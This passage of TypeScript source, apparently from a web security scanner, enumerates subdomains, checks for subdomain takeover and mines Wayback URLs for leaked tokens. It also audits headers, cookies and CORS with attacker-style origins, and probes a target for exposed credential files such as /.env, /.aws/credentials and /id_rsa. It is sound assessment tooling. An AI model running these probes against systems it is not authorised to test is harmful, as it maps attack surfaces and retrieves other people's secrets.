  onLog: LogFn,
): Promise<{ subs: string[]; findings: RealFinding[] }> {
  const findings: RealFinding[] = [];
  const subs: string[] = [];
  const parts = hostname.split('.');
  const rootDomain = parts.length > 2 ? parts.slice(-2).join('.') : hostname;
  await onLog(`[${ts()}] Querying crt.sh certificate transparency for ${rootDomain} subdomains...`);
  try {
    const r = await probe(`https://crt.sh/?q=%.${rootDomain}&output=json`, { timeoutMs: 20_000 });
    if (r && r.status === 200 && r.body.startsWith('[')) {
      const records: Array<{ name_value: string }> = JSON.parse(r.body);
      const nameSet = new Set<string>();
      for (const rec of records) {
        for (const name of rec.name_value.split('\n')) {
          const n = name.trim().toLowerCase().replace(/^\*\./, '');
          if (n.endsWith(`.${rootDomain}`) || n === rootDomain) nameSet.add(n);
        }
      }
      const uniqueSubs = [...nameSet].filter((n) => n !== rootDomain);
      subs.push(...uniqueSubs.slice(0, 50));
      const interesting = uniqueSubs.filter((s) =>
        /admin|dev|staging|test|internal|api|vpn|uat|qa|demo|beta|old|legacy/i.test(s),
      );
      if (interesting.length > 0) {
        findings.push({
          title: `${interesting.length} Sensitive Subdomain(s) via Certificate Transparency`,
          severity: 'medium',
          cvss: 5.3,
          cve: null,
          description: `crt.sh reveals ${interesting.length} potentially internal subdomains.`,
          evidence: `Sensitive subdomains:\n${interesting.slice(0, 15).join('\n')}`,
          remediation: 'Audit each subdomain.',
        });
      }
      if (uniqueSubs.length > 20) {
        findings.push({
          title: `Large Attack Surface: ${uniqueSubs.length} Subdomains`,
          severity: 'low',
          cvss: 3.7,
          cve: null,
          description: `${uniqueSubs.length} subdomains discovered.`,
          evidence: `Sample: ${uniqueSubs.slice(0, 10).join(', ')}`,
          remediation: 'Regularly audit subdomains.',
        });
      }
    }
  } catch (err: any) {
    await onLog(`[${ts()}] crt.sh lookup error: ${err?.message ?? String(err)}`);
  }

  const COMMON_SUBS = [
    'www',
    'mail',
    'api',
    'dev',
    'staging',
    'test',
    'admin',
    'portal',
    'dashboard',
    'manage',
    'cdn',
    'static',
    'assets',
    'db',
    'mysql',
    'redis',
    'elastic',
    'kibana',
    'jenkins',
    'gitlab',
    'jira',
    'grafana',
    'monitoring',
    'logs',
    'backup',
    'old',
    'legacy',
    'login',
    'auth',
    'sso',
    'support',
    'help',
    'status',
  ];
  await onLog(`[${ts()}] DNS brute-forcing ${COMMON_SUBS.length} common subdomains...`);
  let bruteFound = 0;
  const results = await Promise.allSettled(
    COMMON_SUBS.map(async (sub) => {
      const fqdn = `${sub}.${rootDomain}`;
      if (subs.includes(fqdn)) return null;
      try {
        const addrs = await dnsResolve.resolve4(fqdn).catch(() => [] as string[]);
        if (addrs.length > 0) return { fqdn, ips: addrs };
        return null;
      } catch {
        return null;
      }
    }),
  );
  const bruteResults: { fqdn: string; ips: string[] }[] = [];
  for (const r of results) {
    if (r.status === 'fulfilled' && r.value) {
      bruteResults.push(r.value);
      bruteFound++;
      if (!subs.includes(r.value.fqdn)) subs.push(r.value.fqdn);
    }
  }
  if (bruteFound > 0) {
    await onLog(`[${ts()}] DNS brute-force found ${bruteFound} additional subdomain(s)`);
    const devSubs = bruteResults.filter((r) =>
      /dev|staging|test|qa|uat|admin|internal/i.test(r.fqdn),
    );
    if (devSubs.length > 0) {
      findings.push({
        title: `Development/Staging Subdomains Accessible (${devSubs.length} found)`,
        severity: 'medium',
        cvss: 6.1,
        cve: null,
        description: `${devSubs.length} dev/staging subdomains are publicly accessible.`,
        evidence: `DNS brute-force:\n${devSubs.map((r) => `${r.fqdn} → ${r.ips.join(', ')}`).join('\n')}`,
        remediation: 'Restrict access via IP allowlisting or VPN.',
      });
    }
  }
  return { subs, findings };
}

const TAKEOVER_FINGERPRINTS: Array<{ service: string; cnamePattern: RegExp; indicator: string }> = [
  {
    service: 'GitHub Pages',
    cnamePattern: /github\.io$/i,
    indicator: "there isn't a github pages site here",
  },
  { service: 'Heroku', cnamePattern: /herokudns\.com$/i, indicator: 'no such app' },
  { service: 'AWS S3', cnamePattern: /s3\.amazonaws\.com$/i, indicator: 'nosuchbucket' },
  {
    service: 'AWS CloudFront',
    cnamePattern: /cloudfront\.net$/i,
    indicator: 'the request could not be satisfied',
  },
  {
    service: 'Azure Web Apps',
    cnamePattern: /azurewebsites\.net$/i,
    indicator: '404 web site not found',
  },
  { service: 'Netlify', cnamePattern: /netlify\.app$/i, indicator: 'not found - request id' },
];

export async function checkSubdomainTakeover(
  subdomains: string[],
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (subdomains.length === 0) return findings;
  const toCheck = subdomains.slice(0, 40);
  await onLog(`[${ts()}] Checking ${toCheck.length} subdomains for takeover...`);
  await Promise.allSettled(
    toCheck.map(async (sub) => {
      try {
        const { stdout } = await execFileAsync('dig', ['+short', '+timeout=3', sub, 'CNAME'], {
          timeout: 8_000,
        });
        const cname = stdout.trim().replace(/\.$/, '');
        if (!cname || cname.length < 4) return;
        const fp = TAKEOVER_FINGERPRINTS.find((f) => f.cnamePattern.test(cname));
        if (!fp) return;
        const r = await probe(`https://${sub}`, { timeoutMs: 8_000 });
        const httpR = !r ? await probe(`http://${sub}`, { timeoutMs: 8_000 }) : null;
        const body = (r?.body ?? httpR?.body ?? '').toLowerCase();
        if (body.includes(fp.indicator)) {
          findings.push({
            title: `Subdomain Takeover: ${sub} → ${fp.service}`,
            severity: 'critical',
            verification: 'verified',
            confidence: 96,
            cvss: 9.8,
            cve: null,
            description: `${sub} has dangling CNAME to ${cname} (${fp.service}).`,
            evidence: `CNAME: ${sub} → ${cname}\nService: ${fp.service}\nIndicator: "${fp.indicator}"`,
            remediation: `Remove CNAME or register the resource on ${fp.service}.`,
          });
          await onLog(`[${ts()}] ⚠ SUBDOMAIN TAKEOVER: ${sub} → ${fp.service}`);
        }
      } catch {}
    }),
  );
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 6. IP GEOLOCATION & ASN
// ═══════════════════════════════════════════════════════════════════════════════

export async function getIpInfo(hostname: string, onLog: LogFn): Promise<void> {
  try {
    const ips = await digQuery(hostname, 'A');
    if (ips.length === 0) return;
    const ip = ips[0]!;
    const r = await probe(`https://ipinfo.io/${ip}/json`, { timeoutMs: 8_000 });
    if (r && r.status === 200) {
      const info = JSON.parse(r.body);
      await onLog(
        `[${ts()}] IP Intel: ${ip} | ${info.org ?? 'Unknown ASN'} | ${info.city ?? ''}, ${info.country ?? ''} | Hosting: ${info.hostname ?? '—'}`,
      );
    }
  } catch {}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 7. WAYBACK MACHINE
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkWayback(hostname: string, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Querying Wayback Machine CDX API...`);
  try {
    const url = `https://web.archive.org/cdx/search/cdx?url=${hostname}/*&output=json&fl=original&collapse=urlkey&limit=200&filter=statuscode:200`;
    const r = await probe(url, { timeoutMs: 20_000 });
    if (!r || r.status !== 200) return findings;
    const rows: string[][] = JSON.parse(r.body);
    if (rows.length < 2) return findings;
    const urls = rows
      .slice(1)
      .map((r) => r[0]!)
      .filter(Boolean);
    await onLog(`[${ts()}] Wayback Machine: ${urls.length} historical URL(s)`);
    const sensitive = urls.filter(
      (u) =>
        /\.(sql|bak|zip|tar|gz|env|config|conf|cfg|log|xml|json|key|pem|p12|pfx|yaml|yml|ini|htpasswd|git|svn)/i.test(
          u,
        ) ||
        /\/admin|\/backup|\/\.env|\/config|\/debug|\/test|\/dev|\/api\/internal|\/private/i.test(u),
    );
    if (sensitive.length > 0) {
      findings.push({
        title: `${sensitive.length} Sensitive Historical URL(s) in Wayback Machine`,
        severity: 'medium',
        verification: 'suspected',
        confidence: 55,
        cvss: 5.3,
        cve: null,
        description: `Wayback Machine has archived sensitive paths.`,
        evidence: `Sensitive URLs:\n${sensitive.slice(0, 15).join('\n')}`,
        remediation: 'Audit each URL.',
      });
    }
    const apiKeyUrls = urls.filter((u) =>
      /api[_-]?key=|apikey=|access_token=|secret=|password=|token=/i.test(u),
    );
    if (apiKeyUrls.length > 0) {
      findings.push({
        title: 'API Keys or Secrets Found in Historical URLs',
        severity: 'high',
        verification: 'suspected',
        confidence: 60,
        cvss: 8.1,
        cve: null,
        description: `${apiKeyUrls.length} URLs contain potential secrets.`,
        evidence: `API key URLs:\n${apiKeyUrls.slice(0, 5).join('\n')}`,
        remediation: 'Revoke exposed credentials immediately.',
      });
    }
  } catch (err: any) {
    await onLog(`[${ts()}] Wayback lookup error: ${err?.message ?? 'timeout'}`);
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 8. HTTP SECURITY HEADERS
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkHeaders(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const r = await probe(target.url, { timeoutMs: 12_000 });
  if (!r) {
    await onLog(`[${ts()}] WARNING: Could not reach ${target.url} for header check`);
    return findings;
  }
  const h = r.headers;
  const ev = (info: string) =>
    `GET ${target.url} → HTTP ${r.status}\nResponse headers:\n${r.rawHeaders}\n\n${info}`;
  await onLog(`[${ts()}] HTTP ${r.status} — checking ${Object.keys(h).length} response headers...`);

  if (!target.isHttps) {
    const httpR = await probe(`http://${target.hostname}/`, {
      followRedirects: false,
      timeoutMs: 8_000,
    });
    if (httpR && httpR.status >= 200 && httpR.status < 300) {
      findings.push({
        title: 'HTTP Not Redirected to HTTPS',
        severity: 'high',
        cvss: 7.4,
        cve: null,
        description: 'The server serves content over HTTP without redirecting.',
        evidence: `GET http://${target.hostname}/ → HTTP ${httpR.status}`,
        remediation: 'Configure 301 redirect to HTTPS.',
      });
    }
  }

  const hsts = h['strict-transport-security'];
  if (target.isHttps && !hsts) {
    findings.push({
      title: 'Missing HTTP Strict Transport Security (HSTS)',
      severity: 'medium',
      cvss: 6.1,
      cve: null,
      description: 'HSTS header is absent.',
      evidence: ev('Strict-Transport-Security: (absent)'),
      remediation: 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
    });
  } else if (hsts) {
    const maxAgeMatch = hsts.match(/max-age=(\d+)/i);
    const maxAge = maxAgeMatch ? parseInt(maxAgeMatch[1]!) : 0;
    if (maxAge < 31536000) {
      findings.push({
        title: 'HSTS max-age Too Short',
        severity: 'low',
        cvss: 3.1,
        cve: null,
        description: `HSTS max-age is ${maxAge} seconds (${Math.round(maxAge / 86400)} days).`,
        evidence: ev(`Strict-Transport-Security: ${hsts}`),
        remediation: 'Set max-age to at least 31536000 (1 year).',
      });
    }
  }

  if (!h['content-security-policy']) {
    findings.push({
      title: 'Missing Content-Security-Policy Header',
      severity: 'medium',
      cvss: 6.1,
      cve: null,
      description: 'No CSP header is set.',
      evidence: ev('Content-Security-Policy: (absent)'),
      remediation: 'Implement a strict CSP.',
    });
  } else {
    const csp = h['content-security-policy'];
    if (/unsafe-eval/i.test(csp)) {
      findings.push({
        title: "CSP Contains 'unsafe-eval'",
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: "CSP includes 'unsafe-eval'.",
        evidence: ev(`Content-Security-Policy: ${csp.slice(0, 200)}`),
        remediation: "Remove 'unsafe-eval'.",
      });
    }
    if (/unsafe-inline/i.test(csp) && !/nonce-|hash-|sha/i.test(csp)) {
      findings.push({
        title: "CSP Contains 'unsafe-inline' Without Nonce/Hash",
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: 'CSP allows all inline scripts.',
        evidence: ev(`Content-Security-Policy: ${csp.slice(0, 200)}`),
        remediation: 'Replace with nonce-based CSP.',
      });
    }
    if (/\*/.test(csp.split('script-src')[1]?.split(';')[0] ?? '')) {
      findings.push({
        title: 'CSP script-src Allows Wildcard Origin',
        severity: 'high',
        cvss: 7.4,
        cve: null,
        description: 'CSP script-src includes a wildcard (*).',
        evidence: ev(`Content-Security-Policy: ${csp.slice(0, 300)}`),
        remediation: 'Replace wildcard with explicit trusted domains.',
      });
    }
  }

  const xfo = h['x-frame-options'] ?? '';
  const cspFa = h['content-security-policy'] ?? '';
  if (!xfo && !cspFa.toLowerCase().includes('frame-ancestors')) {
    findings.push({
      title: 'Clickjacking Protection Missing',
      severity: 'medium',
      cvss: 6.1,
      cve: null,
      description: 'No X-Frame-Options or CSP frame-ancestors.',
      evidence: ev('X-Frame-Options: (absent)'),
      remediation: 'Add: X-Frame-Options: DENY',
    });
  }
  if (!h['x-content-type-options']) {
    findings.push({
      title: 'Missing X-Content-Type-Options Header',
      severity: 'low',
      cvss: 3.7,
      cve: null,
      description: 'Without nosniff, MIME-sniffing possible.',
      evidence: ev('X-Content-Type-Options: (absent)'),
      remediation: 'Add: X-Content-Type-Options: nosniff',
    });
  }
  if (!h['referrer-policy']) {
    findings.push({
      title: 'Missing Referrer-Policy Header',
      severity: 'low',
      cvss: 3.1,
      cve: null,
      description: 'Referrer-Policy absent.',
      evidence: ev('Referrer-Policy: (absent)'),
      remediation: 'Add: Referrer-Policy: strict-origin-when-cross-origin',
    });
  }
  if (!h['permissions-policy']) {
    findings.push({
      title: 'Missing Permissions-Policy Header',
      severity: 'low',
      cvss: 3.1,
      cve: null,
      description: 'Permissions-Policy absent.',
      evidence: ev('Permissions-Policy: (absent)'),
      remediation: 'Add: Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()',
    });
  }
  const server = h['server'] ?? '';
  if (server && /[\d.]/.test(server)) {
    findings.push({
      title: 'Server Version Disclosed',
      severity: 'low',
      cvss: 4.3,
      cve: null,
      description: `Server header: "${server}".`,
      evidence: ev(`Server: ${server}`),
      remediation: 'Suppress Server header.',
    });
  }
  for (const discHeader of [
    'x-powered-by',
    'x-aspnet-version',
    'x-aspnetmvc-version',
    'x-generator',
  ]) {
    const val = h[discHeader];
    if (val) {
      findings.push({
        title: `Technology Disclosed via ${discHeader}`,
        severity: 'low',
        cvss: 3.1,
        cve: null,
        description: `${discHeader}: ${val}`,
        evidence: ev(`${discHeader}: ${val}`),
        remediation: `Suppress ${discHeader} header.`,
      });
    }
  }

  // CORS
  const corsTestOrigins = ['https://attacker.com', 'https://evil.attacker.example'];
  let corsFound = false;
  for (const attackerOrigin of corsTestOrigins) {
    if (corsFound) break;
    const corsR = await probe(target.url, {
      headers: { Origin: attackerOrigin, 'Access-Control-Request-Method': 'GET' },
      timeoutMs: 8_000,
    });
    if (!corsR) continue;
    const acao = corsR.headers['access-control-allow-origin'] ?? '';
    const acac = corsR.headers['access-control-allow-credentials'] ?? '';
    if (acao === '*') {
      findings.push({
        title: 'CORS Wildcard Origin (*)',
        severity: 'medium',
        cvss: 6.5,
        cve: null,
        description: 'Any origin can read responses.',
        evidence: `Origin: ${attackerOrigin}\nAccess-Control-Allow-Origin: *`,
        remediation: 'Replace * with explicit allowlist.',
      });
      corsFound = true;
    } else if (acao === attackerOrigin && acac.toLowerCase() === 'true') {
      findings.push({
        title: 'CRITICAL: CORS Reflects Arbitrary Origin + Credentials',
        severity: 'critical',
        cvss: 9.0,
        cve: null,
        description: 'Server reflects origin and allows credentials.',
        evidence: `Origin: ${attackerOrigin}\nAccess-Control-Allow-Origin: ${acao}\nAccess-Control-Allow-Credentials: ${acac}`,
        remediation: 'Never combine reflected origin with credentials.',
      });
      corsFound = true;
    } else if (acao === attackerOrigin && acac.toLowerCase() !== 'true') {
      findings.push({
        title: 'CORS Reflects Arbitrary Origin (No Credentials)',
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: 'Server reflects origin without credentials.',
        evidence: `Origin: ${attackerOrigin}\nAccess-Control-Allow-Origin: ${acao}`,
        remediation: 'Validate Origin against strict allowlist.',
      });
      corsFound = true;
    }
  }

  // Cookie security
  const setCookie = h['set-cookie'] ?? '';
  if (setCookie) {
    const lower = setCookie.toLowerCase();
    const nameMatch = setCookie.match(/^([^=;,\s]+)/);
    const cookieName = nameMatch?.[1]?.trim() ?? 'cookie';
    if (!lower.includes('httponly')) {
      findings.push({
        title: `Cookie Missing HttpOnly Flag (${cookieName})`,
        severity: 'medium',
        cvss: 6.1,
        cve: null,
        description: `Cookie "${cookieName}" readable by JavaScript.`,
        evidence: `Set-Cookie: ${setCookie.slice(0, 200)}`,
        remediation: `Add HttpOnly flag.`,
      });
    }
    if (target.isHttps && !lower.includes('secure')) {
      findings.push({
        title: `Cookie Missing Secure Flag (${cookieName})`,
        severity: 'medium',
        cvss: 5.9,
        cve: null,
        description: `Cookie "${cookieName}" can be sent over HTTP.`,
        evidence: `Set-Cookie: ${setCookie.slice(0, 200)}`,
        remediation: `Add Secure flag.`,
      });
    }
    if (!lower.includes('samesite')) {
      findings.push({
        title: `Cookie Missing SameSite Attribute (${cookieName})`,
        severity: 'low',
        cvss: 4.3,
        cve: null,
        description: `Cookie "${cookieName}" missing SameSite.`,
        evidence: `Set-Cookie: ${setCookie.slice(0, 200)}`,
        remediation: `Add SameSite=Strict.`,
      });
    }
  }

  // TRACE method
  const traceR = await probe(target.url, { method: 'TRACE', timeoutMs: 6_000 });
  if (traceR && traceR.status === 200) {
    findings.push({
      title: 'HTTP TRACE Method Enabled',
      severity: 'medium',
      cvss: 5.3,
      cve: null,
      description: 'TRACE method enabled.',
      evidence: `TRACE ${target.url} → HTTP ${traceR.status}`,
      remediation: 'Disable TRACE.',
    });
  }

  await onLog(`[${ts()}] HTTP header analysis complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 9. TECHNOLOGY FINGERPRINTING
// ═══════════════════════════════════════════════════════════════════════════════

interface TechProfile {
  name: string;
  version?: string;
  category: string;
}

export async function fingerprint(
  target: Target,
  onLog: LogFn,
): Promise<{ techs: TechProfile[]; findings: RealFinding[] }> {
  const techs: TechProfile[] = [];
  const findings: RealFinding[] = [];
  const r = await probe(target.url);
  if (!r) return { techs, findings };
  const h = r.headers;
  const body = r.body;

  const server = h['server'] ?? '';
  if (server) techs.push({ name: server, category: 'Web Server' });

  if (body.includes('/wp-content/') || body.includes('/wp-includes/') || h['x-pingback']) {
    const vMatch = body.match(/WordPress\s+([\d.]+)/i);
    techs.push({ name: 'WordPress', version: vMatch?.[1], category: 'CMS' });
    findings.push({
      title: 'WordPress CMS Detected',
      severity: 'low',
      cvss: 3.7,
      cve: null,
      description: `WordPress${vMatch?.[1] ? ` ${vMatch[1]}` : ''} detected.`,
      evidence: `WordPress indicators in response body`,
      remediation: 'Keep WordPress and plugins updated.',
    });
  }
  if (body.includes('Drupal') || h['x-generator']?.includes('Drupal'))
    techs.push({ name: 'Drupal', category: 'CMS' });
  if (body.includes('/components/com_') || body.includes('Joomla'))
    techs.push({ name: 'Joomla', category: 'CMS' });
  if (body.includes('__REACT_DEVTOOLS') || body.includes('react-dom') || body.includes('_react'))
    techs.push({ name: 'React', category: 'Frontend Framework' });
  if (h['x-powered-by']?.includes('Next.js') || body.includes('__NEXT_DATA__')) {
    techs.push({ name: 'Next.js', category: 'Frontend Framework' });
    if (body.includes('"props"') && body.includes('"pageProps"') && body.includes('"buildId"')) {
      const buildIdMatch = body.match(/"buildId":"([^"]+)"/);
      findings.push({
        title: 'Next.js Build ID Exposed',
        severity: 'low',
        cvss: 3.1,
        cve: null,
        description: `Next.js build ID${buildIdMatch ? ` (${buildIdMatch[1]})` : ''} exposed.`,
        evidence: `__NEXT_DATA__ present`,
        remediation: 'Acceptable for public pages.',
      });
    }
  }
  if (body.includes('laravel_session') || h['set-cookie']?.includes('laravel'))
    techs.push({ name: 'Laravel (PHP)', category: 'Backend Framework' });
  if (
    h['x-frame-options'] === 'SAMEORIGIN' &&
    h['x-content-type-options'] === 'nosniff' &&
    !h['content-security-policy']
  )
    techs.push({ name: 'Possibly Django (Python)', category: 'Backend Framework' });
  if (server.includes('nginx'))
    techs.push({
      name: `Nginx ${server.match(/nginx\/([\d.]+)/i)?.[1] ?? ''}`.trim(),
      category: 'Web Server',
    });
  if (server.toLowerCase().includes('apache'))
    techs.push({
      name: `Apache ${server.match(/apache\/([\d.]+)/i)?.[1] ?? ''}`.trim(),
      category: 'Web Server',
    });
  if (h['cf-ray'] || h['cf-cache-status']) {
    techs.push({ name: 'Cloudflare CDN', category: 'CDN/WAF' });
    await onLog(`[${ts()}] Cloudflare WAF/CDN detected`);
  }
  if (h['x-amz-request-id'] || h['x-amzn-trace-id'] || h['x-amz-cf-id'])
    techs.push({ name: 'AWS (CloudFront/ALB)', category: 'Cloud' });
  if (h['x-amz-function-arn'] || h['x-amz-executed-version']) {
    techs.push({ name: 'AWS Lambda', category: 'Serverless' });
    findings.push({
      title: 'AWS Lambda Function Detected',
      severity: 'low',
      cvss: 3.1,
      cve: null,
      description: 'AWS Lambda ARN header exposed.',
      evidence: `x-amz-function-arn: ${h['x-amz-function-arn'] ?? '(detected)'}`,
      remediation: 'Strip AWS Lambda metadata headers.',
    });
  }
  if (
    body.includes('"kind":"Status"') ||
    (body.includes('"apiVersion"') && body.includes('"items"'))
  ) {
    techs.push({ name: 'Kubernetes API', category: 'Container Orchestration' });
    findings.push({
      title: 'Kubernetes API Response Detected',
      severity: 'high',
      cvss: 8.1,
      cve: null,
      description: 'Kubernetes API response detected.',
      evidence: `Response contains Kubernetes JSON fields`,
      remediation: 'Restrict Kubernetes API server to internal IPs.',
    });
  }
  if (
    h['server']?.toLowerCase().includes('docker') ||
    (body.includes('"ApiVersion"') && body.includes('"Os"'))
  ) {
    techs.push({ name: 'Docker API', category: 'Container' });
    findings.push({
      title: 'Docker Daemon API Exposed',
      severity: 'critical',
      cvss: 10.0,
      cve: null,
      description: 'Docker API is publicly accessible.',
      evidence: `Docker API indicators in response`,
      remediation: 'Disable remote Docker API.',
    });
  }
  if (
    body.includes('org.apache.struts') ||
    body.includes('struts.apache.org') ||
    /\.action(\?|$)/i.test(r.finalUrl)
  ) {
    techs.push({ name: 'Apache Struts', category: 'Backend Framework' });
    findings.push({
      title: 'Apache Struts Framework Detected',
      severity: 'medium',
      cvss: 6.1,
      cve: null,
      description: 'Apache Struts detected.',
      evidence: `Struts indicators found`,
      remediation: 'Update Struts to latest.',
    });
  }
  if (techs.length > 0)
    await onLog(
      `[${ts()}] Technologies: ${techs.map((t) => `${t.name} (${t.category})`).join(', ')}`,
    );
  return { techs, findings };
}

// ═══════════════════════════════════════════════════════════════════════════════
// 10. SENSITIVE PATH DISCOVERY
// ═══════════════════════════════════════════════════════════════════════════════

const SENSITIVE_PATHS: { path: string; deep?: boolean; finding: Omit<RealFinding, 'evidence'> }[] =
  [
    {
      path: '/.env',
      finding: {
        title: '.env File Exposed',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: 'The .env file is publicly accessible.',
        remediation: 'Block access to .env files.',
      },
    },
    {
      path: '/.git/config',
      finding: {
        title: 'Git Repository Exposed (.git/config)',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: '.git directory is accessible.',
        remediation: 'Block /.git/ access.',
      },
    },
    {
      path: '/robots.txt',
      finding: {
        title: 'robots.txt Reveals Internal Paths',
        severity: 'low',
        cvss: 3.1,
        cve: null,
        description: 'robots.txt is accessible.',
        remediation: 'Review for sensitive paths.',
      },
    },
    {
      path: '/phpinfo.php',
      finding: {
        title: 'PHP Info Page Exposed',
        severity: 'high',
        cvss: 7.5,
        cve: null,
        description: 'phpinfo() output publicly accessible.',
        remediation: 'Delete phpinfo.php.',
      },
    },
    {
      path: '/wp-login.php',
      finding: {
        title: 'WordPress Admin Login Exposed',
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: 'WordPress login publicly accessible.',
        remediation: 'Rename wp-login.php, add IP restrictions.',
      },
    },
    {
      path: '/.env.local',
      finding: {
        title: '.env.local File Exposed',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: '.env.local publicly accessible.',
        remediation: 'Block all .env* files.',
      },
    },
    {
      path: '/.env.production',
      finding: {
        title: '.env.production Exposed',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: 'Production environment file exposed.',
        remediation: 'Block .env* files.',
      },
    },
    {
      path: '/.git/HEAD',
      finding: {
        title: 'Git Repository HEAD Exposed',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: '.git directory accessible.',
        remediation: 'Block /.git/ access.',
      },
    },
    {
      path: '/backup.sql',
      finding: {
        title: 'Database Backup Exposed (backup.sql)',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: 'SQL backup publicly downloadable.',
        remediation: 'Remove backup files from web root.',
      },
    },
    {
      path: '/dump.sql',
      finding: {
        title: 'Database Dump Exposed (dump.sql)',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: 'SQL dump publicly accessible.',
        remediation: 'Remove dump files.',
      },
    },
    {
      path: '/adminer.php',
      finding: {
        title: 'Adminer Database UI Exposed',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: 'Adminer is publicly accessible.',
        remediation: 'Remove Adminer from production.',
      },
    },
    {
      path: '/phpmyadmin/',
      finding: {
        title: 'phpMyAdmin Exposed',
        severity: 'high',
        cvss: 8.1,
        cve: null,
        description: 'phpMyAdmin publicly accessible.',
        remediation: 'Restrict to internal IPs.',
      },
    },
    {
      path: '/.DS_Store',
      finding: {
        title: '.DS_Store File Exposed',
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: 'macOS .DS_Store exposed.',
        remediation: 'Block .DS_Store files.',
      },
    },
    {
      path: '/.htpasswd',
      finding: {
        title: '.htpasswd File Exposed',
        severity: 'critical',
        cvss: 9.8,
        cve: null,
        description: '.htpasswd credential file publicly readable.',
        remediation: 'Block .htpasswd.',
      },
    },
    {
      path: '/config.php',
      finding: {
        title: 'config.php Exposed',
        severity: 'high',
        cvss: 7.5,
        cve: null,
        description: 'Configuration file may contain credentials.',
        remediation: 'Move config outside web root.',
      },
    },
    {
      path: '/.well-known/security.txt',
      finding: {
        title: 'security.txt Present (Informational)',
        severity: 'low',
        cvss: 0,
        cve: null,
        description: 'RFC 9116 security.txt found.',
        remediation: 'Keep up-to-date.',
        verification: 'informational',
        confidence: 99,
      },
    },
    {
      path: '/api/v1/',
      finding: {
        title: 'API v1 Endpoint Accessible',
        severity: 'low',
        cvss: 3.1,
        cve: null,
        description: 'API endpoint discovered.',
        remediation: 'Ensure proper authentication.',
      },
    },
    {
      path: '/graphql',
      finding: {
        title: 'GraphQL Endpoint Exposed',
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: 'GraphQL endpoint publicly accessible.',
        remediation: 'Disable introspection, require auth.',
      },
    },
    {
      path: '/crossdomain.xml',
      finding: {
        title: 'crossdomain.xml Present',
        severity: 'low',
        cvss: 3.1,
        cve: null,
        description: 'Flash crossdomain.xml found.',
        remediation: 'Remove if Flash not used.',
      },
    },
    {
      path: '/.aws/credentials',
      finding: {
        title: 'AWS Credentials File Exposed',
        severity: 'critical',
        cvss: 10.0,
        cve: null,
        description: 'AWS credentials publicly accessible.',
        remediation: 'Remove and revoke keys.',
      },
    },
    {
      path: '/id_rsa',
      finding: {
        title: 'SSH Private Key Exposed (id_rsa)',
        severity: 'critical',
        cvss: 10.0,
        cve: null,
        description: 'SSH private key publicly accessible.',
        remediation: 'Remove and rotate key pair.',
      },
    },
  ];

export async function checkSensitivePaths(
  target: Target,
  deep: boolean,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const paths = SENSITIVE_PATHS.filter((p) => !p.deep || deep);
  await onLog(`[${ts()}] Probing ${paths.length} sensitive paths...`);
  const BATCH = 12;
  const findings: RealFinding[] = [];
  const notFoundUrl = `${target.url.replace(/\/$/, '')}/sentinelx-not-found-${Date.now()}`;
  const notFound = await probe(notFoundUrl, { timeoutMs: 8_000 });
  const compact = (value: string) => value.replace(/\s+/g, ' ').trim().slice(0, 4_000);
  const contentMarkers: Record<string, RegExp> = {
    '/.env': /(?:^|\n)\s*[A-Z][A-Z0-9_]{2,}\s*=/,
    '/.git/config': /^\s*(?:\[core\]|repositoryformatversion|ref:)/im,
    '/.git/HEAD': /^\s*ref:\s+refs\//im,
    '/backup.sql': /(create\s+table|insert\s+into|--\s*(?:mysql|postgres|sql))/i,
    '/phpinfo.php': /(php version|phpinfo\(\)|configuration file)/i,
    '/wp-login.php': /(wp-login|user_login|wordpress)/i,
    '/robots.txt': /(?:^|\n)\s*(?:user-agent|disallow|sitemap)\s*:/i,
  };

  for (let i = 0; i < paths.length; i += BATCH) {
    const batch = paths.slice(i, i + BATCH);
    const results = await Promise.allSettled(
      batch.map(async ({ path, finding }) => {
        const url = target.url.replace(/\/$/, '') + path;
        const result = await probe(url, { timeoutMs: 8_000 });
        if (!result || result.status !== 200) return null;
        const resultBody = compact(result.body);
        const baselineBody = notFound ? compact(notFound.body) : '';
        if (notFound && result.status === notFound.status && resultBody === baselineBody)
          return null;
        const marker = contentMarkers[path];
        if (marker && !marker.test(result.body)) return null;
        if (!marker && resultBody.toLowerCase().includes('404') && result.body.length < 2_000)
          return null;
        const snippet = result.body.slice(0, 300).replace(/\s+/g, ' ').trim();
        return {
          ...finding,
          evidence: `GET ${url} → HTTP ${result.status} (${result.durationMs}ms)\nContent-Type: ${result.headers['content-type'] ?? 'unknown'}\nBody preview: ${snippet || '(empty)'}`,
        } as RealFinding;
      }),
    );
    for (const r of results) {
      if (r.status === 'fulfilled' && r.value) {
        findings.push(r.value);
        await onLog(`[${ts()}] FOUND: ${r.value.title}`);
      }
    }
  }

  await onLog(`[${ts()}] Path discovery: ${findings.length} exposure(s) found`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 11. WEB APPLICATION VULNERABILITY PROBES (SQLi, XSS, NoSQL, CMDi, redirects, etc.)
// ═══════════════════════════════════════════════════════════════════════════════

const SQLI_PATTERNS = [
  /you have an error in your sql syntax/i,
